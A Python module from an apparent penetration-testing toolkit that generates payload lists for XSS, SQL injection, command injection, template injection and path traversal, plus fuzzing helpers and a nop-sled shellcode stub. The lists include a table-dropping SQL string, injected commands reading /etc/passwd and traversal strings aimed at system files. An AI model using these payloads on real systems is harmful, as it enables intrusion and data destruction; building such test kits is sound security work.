"""
Craft Factory — Payload & Exploit Primitive Generator
Generates test payloads for authorized security assessments: XSS, SQLi, command injection, etc.
"""

from __future__ import annotations

import base64
import urllib.parse
from typing import Any

from shadowcypher.core.module import BaseModule

# ── XSS payloads ──────────────────────────────────────────────────────────────
_XSS_PAYLOADS: list[str] = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "'\"><script>alert(document.domain)</script>",
    "javascript:alert(1)",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "<details open ontoggle=alert(1)>",
    "<body onload=alert(1)>",
    "<math><mtext></table><img src=1 onerror=alert(1)>",
    "';alert(String.fromCharCode(88,83,83))//",
]

# ── SQLi payloads ──────────────────────────────────────────────────────────────
_SQLI_PAYLOADS: list[str] = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "') OR ('1'='1",
    "1; DROP TABLE users--",
    "1 UNION SELECT NULL--",
    "1 UNION SELECT NULL,NULL--",
    "1 UNION SELECT NULL,NULL,NULL--",
    "' AND SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1 AND 1=1",
    "1 AND 1=2",
    "' AND '1'='1' --",
]

# ── Command injection ──────────────────────────────────────────────────────────
_CMDI_PAYLOADS: list[str] = [
    "; id",
    "| id",
    "|| id",
    "& id",
    "&& id",
    "`id`",
    "$(id)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "'; sleep 5 #",
    "1; sleep${IFS}5",
]

# ── SSTI payloads ──────────────────────────────────────────────────────────────
_SSTI_PAYLOADS: list[str] = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "{{config}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "#{7*7}",
    "*{7*7}",
]

# ── Path traversal ─────────────────────────────────────────────────────────────
_PATH_TRAVERSAL_PAYLOADS: list[str] = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
]


class CraftFactory(BaseModule):
    """Generates test payloads for authorized security assessments."""

    def __init__(self):
        super().__init__(module_name="craft_factory")

    # ── Payload generation ────────────────────────────────────────────────────

    def xss_payloads(self, encode: str | None = None) -> list[str]:
        """
        Return XSS test payloads.
        encode: None | 'url' | 'html' | 'base64'
        """
        return self._encode_list(_XSS_PAYLOADS, encode)

    def sqli_payloads(self, encode: str | None = None) -> list[str]:
        """Return SQL injection test payloads."""
        return self._encode_list(_SQLI_PAYLOADS, encode)

    def cmdi_payloads(self, encode: str | None = None) -> list[str]:
        """Return command injection test payloads."""
        return self._encode_list(_CMDI_PAYLOADS, encode)

    def ssti_payloads(self, encode: str | None = None) -> list[str]:
        """Return Server-Side Template Injection payloads."""
        return self._encode_list(_SSTI_PAYLOADS, encode)

    def path_traversal_payloads(self, encode: str | None = None) -> list[str]:
        """Return path traversal test payloads."""
        return self._encode_list(_PATH_TRAVERSAL_PAYLOADS, encode)

    def full_kit(self) -> dict[str, list[str]]:
        """Return all payload categories."""
        return {
            "xss": self.xss_payloads(),
            "sqli": self.sqli_payloads(),
            "cmdi": self.cmdi_payloads(),
            "ssti": self.ssti_payloads(),
            "path_traversal": self.path_traversal_payloads(),
        }

    # ── Fuzzing helpers ───────────────────────────────────────────────────────

    def fuzz_boundary(self, length: int = 512) -> str:
        """Generate a boundary-detection string for buffer overflow fuzzing."""
        return "A" * length

    def cyclic_pattern(self, length: int = 100) -> str:
        """Generate a de Bruijn-style cyclic pattern of exactly `length` bytes for offset detection."""
        chars = "abcdefghijklmnopqrstuvwxyz"
        n = len(chars)
        result: list[str] = []
        for a in range(n):
            for b in range(n):
                for c in range(n):
                    result.append(chars[a])
                    result.append(chars[b])
                    result.append(chars[c])
                    if len(result) >= length:
                        return "".join(result[:length])
        return "".join(result[:length])

    def shellcode_stub(self, arch: str = "x64") -> dict[str, Any]:
        """
        Return a benign test shellcode stub (nop sled + immediate return) for sandbox testing.
        Not a working exploit — only for verifying shellcode injection paths in sandboxes.
        """
        stubs = {
            "x64": b"\x90" * 16 + b"\x48\x31\xc0\xc3",  # nop*16 + xor rax,rax; ret
            "x86": b"\x90" * 16 + b"\x31\xc0\xc3",       # nop*16 + xor eax,eax; ret
            "arm":  b"\x00\x00\xa0\xe1" * 4 + b"\x1e\xff\x2f\xe1",  # nop*4 + bx lr
        }
        blob = stubs.get(arch, stubs["x64"])
        return {
            "arch": arch,
            "length": len(blob),
            "hex": blob.hex(),
            "b64": base64.b64encode(blob).decode(),
            "note": "Benign test stub only — nop sled + return, no payload",
        }

    # ── Internal ──────────────────────────────────────────────────────────────

    @staticmethod
    def _encode_list(payloads: list[str], encode: str | None) -> list[str]:
        if encode == "url":
            return [urllib.parse.quote(p) for p in payloads]
        if encode == "html":
            import html
            return [html.escape(p) for p in payloads]
        if encode == "base64":
            return [base64.b64encode(p.encode()).decode() for p in payloads]
        return list(payloads)
